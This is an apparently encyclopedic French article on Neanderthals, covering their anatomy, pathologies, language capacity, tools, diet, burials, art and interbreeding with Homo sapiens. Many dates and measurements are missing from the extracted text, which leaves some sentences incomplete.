En 2011, une équipe internationale publia des travaux concernant le site de Byzovaïa, près du cercle arctique en Russie, où ont été découverts des bifaces taillés typiques de la culture moustérienne, classiquement associée aux Néandertaliens en Europe occidentale. Ces outils datent d'il y a et sont situés plus de mille kilomètres au nord du site le plus septentrional connu pour l'homme de Néandertal, remettant en question la distribution maximale de celui-ci. Ces conclusions ont toutefois été vivement contestées dans une publication ultérieure. Les auteurs considèrent qu'en l'absence de restes fossiles constituant une preuve directe de la présence néandertalienne à cette latitude et à une date aussi récente, l'hypothèse d'un rattachement de l'industrie lithique de Byzovaya au Paléolithique supérieur demeure la plus parcimonieuse.
Caractéristiques physiques.
Squelette.
Les Néandertaliens sont de corpulence souvent très massive et robuste : et en moyenne pour les hommes et et pour les femmes (des individus auraient atteint ). L'ensemble de leur structure (os épais avec corticale développée) et leurs attaches musculaires laissent supposer une grande force physique. Les règles écologiques de Bergmann (corps plus massif qui réduit la déperdition de chaleur) et d'Allen (membres courts qui réduisent également cette déperdition) s'appliquent parfaitement aux néandertaliens dont l'anatomie est une adaptation aux climats froids.
Les Néandertaliens présentent quelques caractères archaïques, hérités de leur prédécesseur (caractères plésiomorphes), ainsi que des caractères évolués (caractères apomorphes). Les caractères évolués peuvent être partagés avec les "Homo sapiens" (caractères synapomorphes) ou bien être des caractères dérivés spécifiques (caractères autapomorphes). Seuls ces derniers permettent d'identifier l'espèce lors de l'examen d'un fossile.
Les traits spécifiques aux Néandertaliens ont souvent été présentés comme des adaptations au froid ; les membres courts et robustes des Néandertaliens trouvent des analogues modernes dans les populations vivant dans les régions proches du pôle. Des facteurs écologiques liés aux avancées glaciaires tels que l'isolement de populations et le faible brassage génétique ont pu favoriser la fixation rapide de ces traits.
Pigmentation et couleur des cheveux.
La rousseur des Néandertaliens a été évoquée à la suite de différentes études mais il semble s'agir de sur-interprétations de résultats scientifiques de la part des médias. Chez les humains, la rousseur est liée à une mutation du gène MC1R (') qui régule la production de mélanine. En 2000, une étude a montré que cette mutation pouvait exister depuis . Certains en ont conclu qu'elle pouvait être apparue chez les Néandertaliens qui l'auraient transmise aux hommes modernes, ce que nuancent les auteurs.
En octobre 2007, un article de la revue ' présente les résultats d'une étude portant sur l'extraction d'ADN fossile de deux spécimens néandertaliens, l'un découvert en Italie (Monti Lessini), l'autre en Espagne ( 1252). Les auteurs ont amplifié et séquencé un fragment du gène MC1R et ont mis en évidence chez les deux individus une mutation inconnue chez l'homme moderne. Toutefois, il est impossible de déterminer si cette mutation était présente sur les deux allèles et donc si elle affectait le phénotype des individus en question. Pour les auteurs, la présence de ces mutations permet d'estimer qu'un pour cent environ des Néandertaliens avait une pigmentation réduite se traduisant par une peau claire et des cheveux roux. Bien que cette proportion soit très limitée, certains médias ont rapporté que les Néandertaliens étaient roux.
Alors que la plupart des musées présentent des reconstitutions de Néandertaliens avec des yeux bleus ou verts, un teint de peau clair et des cheveux roux correspondant à ce que l'on observe chez les populations modernes sous des latitudes équivalentes à celles de l'Europe, une étude génétique parue en 2012 portant sur les ossements de deux femmes néandertaliennes de Croatie suggère la possibilité parallèle d'une peau au teint plus foncé, d'yeux marron et de cheveux bruns.
Paléopathologie.
Une étude de 2024 suggère que Thorin, l'un des derniers Néandertaliens, appartenait à une lignée génétiquement isolée depuis 50 000 ans. Cet isolement et une forte consanguinité pourraient avoir contribué à l'extinction de l'espèce.
Les restes osseux de Néandertaliens, tant en Europe qu'en Asie occidentale, présentent parfois des anomalies qui renseignent sur les lésions organiques survenues de leur vivant et parfois responsables de leur décès. Ces anomalies peuvent être classées en quatre catégories principales :
Traumatologie.
Les Néandertaliens semblent avoir souffert fréquemment de fractures, en particulier au niveau des côtes (Shanidar IV, « vieillard » de La Chapelle-aux-Saints 1), du fémur (La Ferrassie 1), de la fibula (La Ferrassie 2 et ), de la colonne vertébrale (Kébara 2) et du crâne (Shanidar I, Krapina, Šaľa 1). Ces fractures sont souvent ressoudées et ne montrent pas ou peu de signes d'infection, ce qui suggère que les individus étaient pris en charge au cours de leur période d'invalidité.
En relation avec des fractures, d'autres traces de traumatismes ont été signalées sur de nombreux squelettes de Néandertaliens. Ils semblent liés à des blessures perforantes, comme chez Shanidar III dont le poumon fut certainement perforé par une blessure entre les côtes 8 et 9. Il peut s'agir d'une attaque intentionnelle ou d'un accident de chasse, mais l'individu survécut à sa blessure durant quelques semaines avant d'être tué par la chute d'un bloc rocheux dans la grotte de Shanidar. D'autres traumatismes correspondent à des coups portés à la tête (Shanidar I et IV, Krapina), tous consolidés.
Pathologie articulaire.
L'arthrose est particulièrement répandue chez les Néandertaliens les plus âgés. Elle concerne de façon spécifique les articulations comme les chevilles (Shanidar III), la colonne vertébrale et les hanches (« vieillard » de La Chapelle-aux-Saints), les bras (La Quina 5, Krapina, Feldhofer), les genoux, les doigts et les orteils, le tout en relation étroite avec les maladies articulaires dégénératives (arthrose), qui peuvent aller de la dégénérescence normale, liée à l’usure, jusqu’à la restriction des mouvements, douloureuse et handicapante, et à la déformation. C’est ce qu’on observe à des degrés divers sur les squelettes de Shanidar (I-IV).
Pathologie dentaire.
L'hypoplasie de l'émail dentaire est l'indicateur d'un stress survenu durant le développement des dents. Les striations et les cannelures de l'émail reflètent les périodes de pénurie alimentaire, les traumatismes ou les maladies. Une étude de 669 couronnes dentaires de Néandertaliens a montré des signes d'hypoplasie plus ou moins prononcés sur 75 % d'entre elles. Les carences alimentaires en étaient la cause principale, pouvant aller jusqu'à entraîner la perte des dents. Les dents appartenant aux squelettes les plus âgés présentaient toutes une hypoplasie, particulièrement nette chez le « vieillard » de La Chapelle-aux-Saints 1 et l'individu 1 de La Ferrassie.
Pathologie infectieuse.
On trouve occasionnellement sur des squelettes de Néandertaliens des lésions osseuses secondaires liées à une infection des tissus mous du voisinage. Shanidar I présente des traces manifestes de lésions dégénératives de même que La Ferrassie 1, où les lésions sur les deux fémurs, les tibias et les fibulas indiquent une infection systémique ou peut-être un cancer.
Langage et parole.
L'aptitude physique à la parole et au langage des Néandertaliens a longtemps été controversée. Les discussions portent, en particulier, sur l'aptitude physique des Néandertaliens au langage, pour laquelle la morphologie de l'os hyoïde est importante. L'os hyoïde est un petit os qui maintient la base de la langue. Il est présent chez tous les mammifères. Très peu d'os hyoïdes de Néandertaliens ont été mis au jour : un premier a été découvert en 1983 dans la grotte de Kébara, sur le mont Carmel en Israël ( A.P.) et un autre dans le site d’El Sidron en Espagne ( A.P.). Les deux os sont très peu différents de ceux des humains actuels. Des os hyoïdes appartenant à des pré-néandertaliens ont été découverts dans le site de la Sima de los Huesos à en Espagne ( A.P.) ; ils ont également des caractéristiques proches de celui des "Homo sapiens".
En outre, au-delà de la présence ou non de l'os hyoïde, pour le préhistorien Jean-Paul Demoule, il existe plusieurs éléments permettant d'identifier dans la production d'objets des "Homo erectus" tardifs et des premiers Néandertaliens les preuves de la présence d'un « proto-symbolisme » indice probable d'un prélude de langage se situant entre les sons signifiants des chimpanzés et le langage de l'homme moderne.
Concernant le conduit vocal des Néandertaliens, Philip Lieberman a émis en 1971, sur la base d'un travail de modélisation, l'hypothèse selon laquelle ces derniers ne disposaient pas d'un pharynx de taille suffisante pour produire tous les sons que l'on observe dans les langues du monde. Malgré de nombreuses critiques concernant cette argumentation, cette théorie s'est largement diffusée pendant une trentaine d'années. À la suite d'une longue controverse, il semble que les arguments avancés par Lieberman ne soient plus tenables à la lueur des connaissances actuelles. La reconstruction anatomique du conduit vocal qu'il avait utilisée n'était pas réaliste et ses simulations peu convaincantes. Ce n'est pas la taille du pharynx qui permet de parler mais la maîtrise des articulateurs (cordes vocales, langue, mandibule, voile du palais, lèvres). Les nouvelles simulations montrent bien que les Néandertaliens avaient la capacité physique de parler.
Une étude publiée en 2007 et portant sur l'analyse de l'ADN provenant des restes de deux Néandertaliens découverts dans la grotte d'El Sidrón (Espagne) aurait permis d'y détecter la même version de la protéine Forkhead-P2 (" P2") que celle présente chez les hommes modernes. Cela pourrait plaider en faveur de l'aptitude des Néandertaliens au langage puisqu'on estime que ce gène joue un rôle important dans le développement des parties du cerveau liées à la maîtrise du langage articulé.
Une étude publiée en 2021 démontre que les capacités auditives des Néandertaliens étaient les mêmes que celles des humains actuels.
Culture et techniques.
Après avoir longtemps été considéré comme un être archaïque et encore proche de l'animalité, y compris par une partie de la communauté scientifique, l'Homme de Néandertal commence à apparaître comme un être doté de capacités intellectuelles et de traditions culturelles.
Le tableau ci-dessous liste un certain nombre de comportements considérés comme modernes et courants chez "Homo sapiens" ainsi que la fréquence relative de leur mise en œuvre par "Homo neanderthalensis" :
Artisan de la pierre et de l'os.
L'homme de Néandertal est l'auteur d'un outillage complexe et élaboré, et notamment des industries du Moustérien. Ses méthodes de débitage apportent en outre la preuve de ses capacités d'abstraction et d'anticipation, en particulier en ce qui concerne le débitage Levallois. Les éclats obtenus par cette méthode ou par d'autres pouvaient être utilisés bruts ou bien retouchés, légèrement modifiés sur leurs bords pour obtenir des outils plus spécialisés tels que les racloirs ou les denticulés.
Il est probable que les derniers Néandertaliens soient les auteurs du Châtelperronien, un faciès culturel de transition entre le Paléolithique moyen et le Paléolithique supérieur en Europe occidentale. Ce faciès est caractérisé par des comportements longtemps considérés comme propres aux hommes modernes : débitage de lames, utilisation de parure, fabrication d'outils en os.
Des outils en os ont été mis au jour dans les deux sites néandertaliens de Chagyrskaya (Altaï sibérien) et de Chez-Pinaud-Jonzac (Charente-Maritime, France). À Jonzac, les outils en os sont aussi nombreux que ceux en silex, et très divers : percuteurs, couteaux, racloirs, ciseaux, lissoirs. Il s'agit d'une véritable industrie, destinée à des activités variées et nécessitant différentes mises en œuvre. Les outils ont été identifiés à partir des traces de fabrication et d'utilisation présentes en surface, mais aussi à l'intérieur par microtomographie aux rayons X. Ils ont été fabriqués essentiellement par fracturation, à la différence de ceux d"'Homo sapiens", mis en forme principalement par raclage et abrasion.
Artisan du bois.
Des preuves directes (traces d'adhésif naturel en bitume ou en résine) ou indirectes (répartition des traces d'utilisation) montrent que certains outils en pierre étaient utilisés emmanchés. Les manches eux-mêmes, réalisés en matériaux périssables, n'ont pas été conservés. En revanche, des conditions particulièrement favorables ont permis la conservation de quelques objets en bois. Le plus spectaculaire est sans conteste un fragment d'épieu en bois d'if fiché dans le thorax d'un éléphant ("Palaeoloxodon antiquus"), mis au jour à Lehringen (Basse-Saxe, Allemagne) en 1948. Dans le même site, daté de l'Éémien ( AP), sont découverts des éclats Levallois ayant servi à découper de la peau et de la viande.
En 1995, des ouvriers d'une mine de charbon à ciel ouvert proche de Schöningen (également en Basse-Saxe) découvrent des lances en épicéa longues de deux mètres ainsi que d'autres objets en bois incrustés dans la rive d'un ancien lac. Les fouilles de Schöningen révèleront ensuite d'autres restes de bois minutieusement sculptés, notamment des bâtons de jet et d'autres instruments de chasse, ainsi que des dizaines d'outils non destinés à la chasse, datés de . Le site n'a pas livré d'ossements d'hominidés mais la date est celle des premières preuves d'existence des Néandertaliens ailleurs en Europe : les fabricants d'outils étaient sans doute des représentants des premiers Néandertaliens ou peut-être des derniers "Homo heidelbergensis". De nombreux ossements d'animaux ne laissent aucun doute sur le fait qu'ils chassaient des chevaux.
Grand chasseur.
En 1981, l'archéologue Lewis Binford soutient une théorie selon laquelle les premiers hominidés (dont les Néandertaliens) jusqu'au Paléolithique moyen ne pratiquaient que la cueillette ou le charognage passif, seuls les hommes modernes pratiquant la chasse de grand gibier rapide. Cette théorie est aujourd'hui abandonnée.
Rares sont les preuves directes de la pratique de chasse aux grands herbivores par les Néandertaliens telles que le fragment d'épieu en if de et les lances de Schöningen à la pointe parfois durcie au feu ou des pointes emmanchées en silex ou en os, parfois collées au bitume. En revanche, les sites livrent des accumulations impressionnantes d'ossements de grands mammifères (bison à Coudoulous, Lot et à Mauran, Haute-Garonne ; saïga en Crimée ; bouquetin dans la grotte du Lazaret ; aurochs à La Borde, Lot ; cheval à Saint-Césaire, Charente-Maritime) ; elles sont interprétées comme le résultat de chasses saisonnières, parfois avec utilisation d'avens ou de fondrières comme pièges naturels (technique de « chasse à l'abîme »). De plus, les analyses biogéochimiques sur le collagène osseux des Néandertaliens et des mammifères associés montrent une alimentation carnée proche de celle du loup, même en période tempérée. Chasseurs de grands mammifères, les Néandertaliens avaient des stratégies (communautés spécialisées dans la chasse de deux ou trois espèces, technique à l'approche ou à la poursuite de proies en fonction de l'âge et du sexe) qui attestent une parfaite connaissance de l'environnement et de l'éco-éthologie des animaux et un savoir-faire technique développé. Enfin les études anatomiques montrent leur adaptation à la chasse : ils étaient en effet trapus et musclés.
La pratique ponctuelle d'un charognage actif (accès primaire à la carcasse en écartant les prédateurs — hyène des cavernes, loup, lion des cavernes — ou en recherchant les animaux morts dans des pièges naturels) a également été évoquée, notamment pour les grands mammifères (mammouth, rhinocéros laineux).
Société néandertalienne.
Les analyses en paléogénétique réalisées en 2010 dans la grotte d'El Sidrón suggèrent que la société néandertalienne pratique l'exogamie patrilocale.
Certaines constatations de comportements altruistes témoignent de manifestations d'entraide, de solidarité et d'assistance, tel le vieillard retrouvé dans le cimetière de La Chapelle-aux-Saints ou de Shanidar avec un squelette si déformé par la maladie qu'il devait probablement être infirme. Les enfants s'entraînent à la taille d'outils lithiques sur les mêmes sites que les adultes expérimentés.
Au moins un comportement alimentaire, le bris des os pour en extraire la moelle, a révélé un apprentissage social plutôt que technique dans les niveaux du Pléistocène moyen. Une étude sur les assemblages de ces matériaux provenant de la grotte de Bolomor (Valence, Espagne, MIS 9-5e) et celle de Gran Dolina TD10-1 (Burgos, Espagne, MIS 9) : dans un même groupe, les os ne sont pas brisés aux points les plus faibles, dans une logique d'efficacité, mais suivant un comportement socialement acquis. Au sein d'une même grotte, ces comportements changent au fil des époques ; cela suggère l'existence possible d'identités culturelles ou de prédispositions comportementales dépendant des groupes, et pourrait servir de marqueur pour les zones d'extension des différents groupes.
Les analyses génétiques suggèrent que les Néandertaliens de Sibérie vivaient dans des populations relativement isolées de moins de . En revanche, les Néandertaliens d'Europe et les humains modernes anciens semblent avoir vécu dans des populations de plus grande taille.
Un amoncellement d'ossements et d'outils découverts dans la mine de charbon de Neumark-Nord, près de Halle-sur-Saale (Saxe-Anhalt, Allemagne), montre que les Néandertaliens pouvaient se rassembler par centaines, au moins temporairement. Au cours d'environ trois siècles pendant l'Éémien, il y a environ ( avant l'arrivée des premiers "Sapiens"), ils ont abattu au même endroit plus de 70 éléphants ("Palaeoloxodon antiquus"), récoltant jusqu'à 4 tonnes de chair de chaque animal. Sur les d'éléphants, presque tous montrent des signes de dépeçage à l'aide d'outils tranchants, et aucun n'a été rongé par des charognards, signe qu'ils avaient été parfaitement nettoyés. La viande d'un seul éléphant a pu suffire à nourrir pendant une semaine, ou 100 pendant un mois s'ils étaient capables de conserver la viande aussi longtemps.
Alimentation.
Les Néandertaliens ont d'abord été considérés comme exclusivement chasseurs carnivores, faisant partie des superprédateurs (mangeant de grands herbivores alors qu’"Homo sapiens" avait diversifié son alimentation — petit gibier, fruits de mer, poissons d'eau douce et marins). Ce régime alimentaire a parfois été considéré comme l'une des causes de leur extinction.
En 2010, des analyses de phytolithes piégés dans des plaques de tartre de dents fossilisées néandertaliennes provenant de différents sites ont révélé des traces de plantes fossilisées (palmier-dattier, légumineuses, rhizomes de nénuphar, graminées du genre "Triticum" ou "Hordeum"), indiquant un régime alimentaire diversifié et un comportement de chasseur-cueilleur. De plus, certains grains d'amidon retrouvés montrent des processus de cuisson, suggérant que les Néandertaliens, grâce à leur maîtrise du feu, cuisaient ces végétaux en les faisant bouillir. On pensait auparavant que seules les viandes étaient cuites (d'après l'analyse des ossements d’animaux retrouvés dans de nombreux foyers) alors que les végétaux étaient simplement grillés. Les Néandertaliens ont ainsi une alimentation carnée composée essentiellement de grands mammifères mais incluant également des végétaux ou de petits animaux (lagomorphes, oiseaux, mollusques terrestres) lorsque les conditions s'y prêtent. Les produits d'origine animale et végétale constituent respectivement 80 et 20 % de leur régime alimentaire.
En 2011, des restes de coquillages trouvés dans la grotte de Bajondillo dans le Sud de l'Espagne, montrent que des Néandertaliens mangeaient des fruits de mer en Europe dès avant le présent.
En 2012 puis en 2017, l'analyse chimique puis l'identification de restes d’ADN piégés il y a environ dans la plaque dentaire de Néandertaliens découverts en Belgique et en Italie montrent qu’ils mangeaient notamment du rhinocéros laineux, du mouflon et des champignons. Par contre, chez ceux d'El Sidrón (Espagne), datés d'environ , seul de l’ADN végétal a été détecté. Il provient de diverses plantes et champignons (pignon de pin et mousse forestière notamment) . Les Néandertaliens semblent aussi avoir utilisé des analgésiques (acide salicylique trouvé dans le saule) et des antibiotiques naturels ("Penicillium").
En 2012, l'analyse chimique de plaques dentaires de cinq Néandertaliens mis au jour à El Sidrón avait déjà montré la présence de composés végétaux amers pouvant provenir de l'achillée millefeuille, dont l'utilisation était déjà présumée précédemment par la présence de pollens dans une tombe néandertalienne à Shanidar, en Irak, et la camomille. Il s'agit de plantes sans valeur nutritive mais présentant des vertus médicinales ou pouvant servir éventuellement de coupe-faim.
En 2019, l'étude des dépôts moustériens de la grotte de Pié Lombard (Tourrettes-sur-Loup, Alpes-Maritimes, France) révèle les restes fossilisés d'au moins 225 lapins de l'espèce "Oryctolagus cuniculus", de loin l'espèce animale la plus abondamment représentée sur le site.
Par ailleurs, les Néandertaliens chassaient des animaux marins tels que le dauphin ou le phoque. Globalement, les découvertes montrent de plus en plus que leur régime alimentaire était qualitativement aussi diversifié que celui des humains anatomiquement modernes.
En 2022, John McNabb, de l'université de Southampton, relate la découverte du site préhistorique de la Grotte de Shanidar en Irak, qui révèle que Néandertal faisait cuire ses aliments et utilisait des mélanges de diverses légumineuses avec de la viande.
En 2023, des restes cassés et partiellement brûlés de tourteaux ("Cancer pagurus") montrent que les Néandertaliens faisaient cuire des crabes.
Les ossements néandertaliens ont régulièrement un rapport N/N très élevé, qu'on ne trouve que chez des carnivores stricts (comme les hyènes et les loups), ce qu'on sait que les néandertaliens n'étaient pas. Une explication est trouvée en 2025 : comme certains peuples autochtones actuels, les néandertaliens devaient consommer régulièrement de la viande en putréfaction, y compris les asticots, extrêmement riches en .
Sépultures.
S'il est possible qu’"Homo heidelbergensis", l'un des ancêtres probables de l'Homme de Néandertal, ait adopté un comportement particulier vis-à-vis de ses morts à , les premières véritables sépultures connues sont néandertaliennes. Les plus anciennes datent d'environ - et ont été mises au jour au Proche-Orient. Elles se multiplient ensuite et on en trouve en France (La Chapelle-aux-Saints, La Ferrassie, La Quina, Le Moustier, Saint-Césaire), en Belgique (Spy), en Israël (Kébara, Amud), au Kurdistan irakien (Shanidar), en Ouzbékistan (Teshik-Tash). Dans certains cas, elles comprennent des dépôts funéraires (outils lithiques, fragments de faune).
L'une des sépultures de Shanidar renfermait un Néandertalien enterré sous une grande dalle. Une grande quantité de pollens de plantes à fleurs était présente autour du corps. Ces pollens ont longtemps été considérés comme la preuve du dépôt de nombreuses fleurs lors de l'enfouissement. Une étude de 1999 a remis en question cette interprétation, citant des phénomènes post-dépositionnels ou l'action de rongeurs pour expliquer l'accumulation de pollens. Cette étude a cependant été fortement contestée.
Ces sépultures comportent souvent des fosses intentionnelles et sont pratiquement toujours associées à des habitats. Il est peu probable qu'elles n'aient eu qu'un rôle fonctionnel, simplement destiné à faire disparaître la dépouille, même si leur interprétation en termes de religiosité est sujette à discussion.
En 2020, en Dordogne, la dépouille d’un enfant de 2 ans est considéré comme ayant été volontairement enterrée.
Les Néandertaliens ont plusieurs types de rites funéraires : sépultures, inhumations en deux temps après décomposition du corps à l'air libre (traces de désarticulation et décharnement à Shanidar VI et VIII, Krapina, Kébara, combe Grenal), « culture des ancêtres » (analyses de taphonomie sur des crânes isolés et corps sans tête à Kébara), endocannibalisme (Moula-Guercy à Soyons, Ardèche, Vindija et Krapina en Croatie : stries de fracturation sur os frais).
Culte de l'ours.
Dans certains sites tels que celui du Regourdou en Dordogne, des accumulations de crânes d'ours qui semblaient disposés intentionnellement ont été interprétées comme le résultat d'un « culte de l'ours ».
Au Regourdou, un squelette d'ours brun reposait sous une dalle monolithe d'un poids de , dans une fosse peu profonde. À proximité, le corps d'un Néandertalien était couché sur le côté gauche, la tête vers le nord, en position fœtale. Le crâne manquait, mais il restait la mandibule. L’absence du crâne a également été observée dans le cas de la sépulture néandertalienne de Kébara. D'après E. Bonifay, il s'agissait d'une véritable tombe composée d’une fosse dallée, empierrée et couverte de sable et de cendres de foyer. Cette interprétation a largement été remise en question depuis, les accumulations d'ossements d'ours du Regourdou pouvant être liés à des phénomènes taphonomiques liés à l'occupation de la cavité par des ours hibernants.
L'existence du culte de l'ours, popularisée par les romans préhistoriques de l'écrivaine américaine Jean M. Auel, est contestée par de nombreux scientifiques. Les crânes d'ours sont extrêmement résistants et peuvent être déplacés par des phénomènes naturels jusqu'à acquérir des positions évoquant une organisation volontaire mais en fait seulement due au hasard.
Cannibalisme et traitement rituel des cadavres.
La présence de traces de désarticulation, de décharnement, de fracturation intentionnelle ou de calcination sur certains os de Néandertaliens a été interprétée comme un témoignage de la pratique du cannibalisme. Des ossements de sites tels que l'abri Moula, en Ardèche ou Krapina en Croatie présentent de telles traces de découpe. Il est toutefois difficile de démontrer s'il s'agit de cannibalisme plutôt que d'un traitement "post mortem" des dépouilles dans le cadre d'un rite funéraire. Les fragments d'os de Krapina présentent des marques comparables à celles de sépultures secondaires d'une nécropole du découverte dans le Michigan, correspondant à l'ablation de la chair sur une dépouille partiellement décomposée. Certains os crâniens du site des Pradelles à Marillac-le-Franc présentent des traces de découpe correspondant sans doute au prélèvement du cuir chevelu par scalpation.
Le crâne de Néandertalien découvert dans la grotte Guattari (Mont Circé, Italie) a longtemps été considéré comme une preuve irréfutable de rituel anthropophagique : il aurait été déposé dans un cercle de pierre après que le trou occipital avait été élargi pour consommer le cerveau. Des examens approfondis ont montré que le cercle de pierre était probablement naturel et que l'élargissement du trou occipital avait été causé par une hyène, ce que confirme la présence de traces de dents en différents points du crâne.
Cependant, des os humains ont été découverts intentionnellement cassés dans le but d'exploiter la moelle. Ainsi dans la grotte de l'Hyène à Arcy-sur-Cure (Yonne), des os humains étaient mélangés sans aucune distinction aux os d'animaux ayant servi de nourriture, le tout encerclant le principal lieu de vie. Ces découvertes permettent de retenir l'hypothèse du cannibalisme comme fort probable, sans pouvoir trancher s'il s'agit d'un endocannibalisme ou d'un exocannibalisme.
Arts.
La reconnaissance progressive de la culture néandertalienne remet en cause la primauté culturelle de l'homme moderne : alors que l'on pensait il y a peu que la culture technique et symbolique des Néandertaliens était très nettement inférieure quantitativement et qualitativement à celle de l"'Homo sapiens", les découvertes récentes font apparaître que l'Homme de Néandertal avait lui aussi développé certaines techniques évoluées (débitage de lames), et développé ou adopté des traits culturels modernes (sépultures, signes gravés, parures). La thèse du rôle capital de l'arrivée de l"Homo sapiens" en Europe et celle d'une corrélation entre l'évolution biologique et l'évolution culturelle expliquant le plus grand développement de l"Homo sapiens" par son évolution biologique s'en trouvent donc remises en question.
Au Paléolithique moyen apparaissent les premières manifestations de préoccupations esthétiques ou symboliques :
En 2014, la découverte dans la grotte de Gorham (Gibraltar) de formes géométriques gravées sur une paroi recouverte de sédiments datant de plus de est annoncée par l'équipe de . Elles constituent le premier exemple connu d'art pariétal abstrait attribué aux Néandertaliens. Leur réalisation a nécessité plusieurs centaines de passages de la pointe d'un outil de pierre taillée, probablement de silex.
En février 2018, de nouvelles datations viennent confirmer l'origine néandertalienne de créations artistiques (pourtour de main, réseau de lignes, peinture sur paroi) découvertes dans trois grottes espagnoles (grotte de La Pasiega, grotte de Maltravieso et ) : plus de , soit plus de avant l'arrivée en Europe des premiers hommes modernes. Des coquillages percés et teints, trouvés dans une quatrième grotte, sont encore plus vieux. Néanmoins, un article paru le 21 septembre 2018 remet en cause la datation des grottes de Maltravieso et de La Pasiega en raison du manque de corrélation entre le matériau analysé (des efflorescences de calcite) et le phénomène à dater. Quant aux aplats d'oxydes rouges trouvées à Ardales, rien ne prouve leur origine humaine.
L'étude des pigments de la grotte du Renne à Arcy-sur-Cure (Salomon "et al." 2008) permet de conclure que les Néandertaliens ont utilisé des couleurs sur les peaux (vêtements, tentes) bien avant qu'elles n'aient été utilisées pour les peintures rupestres. Les mêmes auteurs, et d'autres, notent la grande quantité de pigments remontant au Moustérien de tradition acheuléenne dans les grottes du Pech-de-l'Azé à Carsac-Aillac, Dordogne, et à d'autres sites de cette époque.
En 2015 un réexamen des serres d'un pygargue à queue blanche, découvertes en 1899 sur le site néandertalien de Krapina en Croatie, révèle un remodelage en vue d'en faire les plus anciens bijoux connus, datés de . Il précède de les plus anciens bijoux connus créés par l’"Homo sapiens" à Skhul en Israël. Les Néandertaliens possédaient donc une culture symbolique avant l'arrivée d’"Homo sapiens" en Europe. Des griffes similaires qui datent de avaient été trouvées au site néandertalien des grottes du Pech-de-l'Azé en France. Sur le même site, des pigments étaient utilisés sur les cuirs travaillés (vêtements, tentes), prouvant que bien avant l'apparition en Europe des peintures rupestres les Néandertaliens savaient manier les matériaux colorants et qu'ils n'ont pas attendu l"'Homo sapiens" pour donner à leurs objets du quotidien une dimension symbolique.
Une controverse scientifique entoure la possible « flûte de Divje Babe », datée d'environ AP, dans un environnement culturel de style et d'époque moustériens, et présentée au Musée national de Slovénie ("Narodni Muzej Slovenije") à Ljubljana comme le plus vieil instrument de musique découvert , et éventuellement attribuable à l'Homme de Néandertal. Le découvreur de l'objet est le paléoanthropologue Ivan Turk ; il est aussi l'auteur de l'hypothèse selon laquelle il s'agit bien d'une ancienne flûte néandertalienne.
Les arguments en faveur et en défaveur de cette hypothèse sont nombreux. Si une nouvelle preuve décisive intervient à l'avenir dans ce débat, cet objet serait la première preuve d'une pratique musicale chez l'Homme de Néandertal. Mais à ce jour (2023), cette controverse au sujet de la nature d'artéfact humain de l'objet ou bien façonné au hasard de l'action de carnivores, ainsi que sur son caractère néandertalien, n'est pas encore tranchée.
Structures de la grotte de Bruniquel.
Deux structures annulaires formées par l'accumulation de tronçons de stalagmites ont été découvertes en 1995 dans la grotte de Bruniquel, mais les campagnes de prélèvements n'ont pu avoir lieu qu'à partir de 2014. Ces structures, constituées de presque 400 « spéléofacts », ont été datées en 2016 : . Cet âge indique qu'elles sont vraisemblablement l’œuvre de l'homme de Néandertal, et même de néandertaliens « archaïques ».
Fabrication de cordage.
En 2020, une équipe internationale a publié une étude décrivant le moulage fossilisé d’un fragment de cordelette torsadée, composée de trois brins eux-mêmes torsadés. Cette découverte a été faite dans l’abri du Maras en Ardèche, daté entre . L’Homme de Néandertal ayant été le seul occupant de ce site, cet artéfact lui a été attribué. Les fibres ont été identifiées comme provenant probablement d’un conifère. C'est la plus ancienne trace de cordage trouvée, la précédente datant de provenant du site Ohalo II.
Hybridations.
Morphologies d'apparence hybride.
Un squelette d'enfant découvert au Portugal a été présenté en 1999 comme un hybride Néandertal/"Homo sapiens". Cette hypothèse est fortement discutée en raison des difficultés à identifier les caractères autapomorphiques chez un individu juvénile, alors que la variabilité de la population concernée est mal connue.
Un squelette d'enfant trouvé en contexte gravettien à Lagar Velho dans la vallée de Lapedo, au centre du Portugal, porterait des caractéristiques des deux espèces. Cet enfant d'environ quatre ans a été inhumé dans une sépulture intentionnelle, il y a . Il est donc postérieur de quelques milliers d'années aux derniers restes clairement attribuables aux Néandertaliens (entre et avant le présent). Cependant le caractère hybride de cet enfant est très discuté et difficile à établir : les caractères dérivés des deux taxons sont moins marqués chez les individus juvéniles que chez les adultes et la variabilité individuelle des enfants de l’époque est absolument inconnue.
Le réexamen (morphologie géométrique, analyse paléogénétique de l'ADN mitochondrial) en 2013 d'une mandibule dite des « amants de Vérone » suggère une hybridation entre un père sapiens et une mère néandertalienne.
Génétique.
En 2010, le séquençage de 63 % du génome de Néandertal effectué par une équipe de l'Institut Max-Planck d'anthropologie évolutionniste coordonnée par Svante Pääbo montre que 1 à 4 % du génome des "Homo sapiens" non africains provient des Néandertaliens. Les "Homo sapiens" d'ascendance africaine n'ont, eux, que peu ou pas d'ADN de Néandertal. Cet apport est réparti sur 20 régions génétiques spécifiques aux "Homo sapiens".
En 2010, des résultats basés sur l'analyse de de paires de bases d'ADN nucléaire, issus d'ossements fossiles de trois Néandertaliens, ont montré que ceux-ci étaient génétiquement plus proches des "Homo sapiens" eurasiatiques que de ceux d'Afrique subsaharienne. Les auteurs en concluaient que les Néandertaliens auraient contribué à hauteur de 1 à 4 % (en moyenne 2,2 %) au génome des populations d'humains modernes non africaines.
Ces croisements entre Néandertaliens et "Homo sapiens" eurasiatiques auraient pu survenir il y a à ans au Proche-Orient&lt;ref name="Science/Genomics"&gt;&lt;/ref&gt;.
En 2012, une étude confirme que Néandertaliens et humains modernes se sont hybridés « quand les humains modernes, porteurs de technologies proches de celles du Paléolithique supérieur, ont rencontré les Néandertaliens alors qu'ils quittaient l'Afrique ».
Si chaque "Homo sapiens" n'a que 1,8 à 2,6 % du génome de Néandertal en lui, en regroupant les différentes séquences éparpillées dans le monde entier, les chercheurs sont parvenus à reconstituer environ 30 % de ce génome .
En 2014, l'étude du génome d'un "Homo sapiens" découvert à Kostenki, en Russie, et daté de ans avant le présent, confirme encore le métissage et permet d'avancer une date à laquelle l'hybridation aurait eu lieu.
En 2015, des analyses génétiques révèlent que le fossile Oase 1 avait un ancêtre récent néandertalien, avec un ADN autosomique néandertalien estimé de 5 à 11 %.
En 2017, le génome d'une seconde néandertalienne provenant de la grotte de Vindija (Croatie) a été séquencé. L'étude a permis de préciser la proportion d'ADN néandertalien chez les Eurasiens (1,8 à 2,6 %) et confirme l'implication de ces gènes néandertaliens dans la résistance au froid et la sensibilité à certaines maladies.
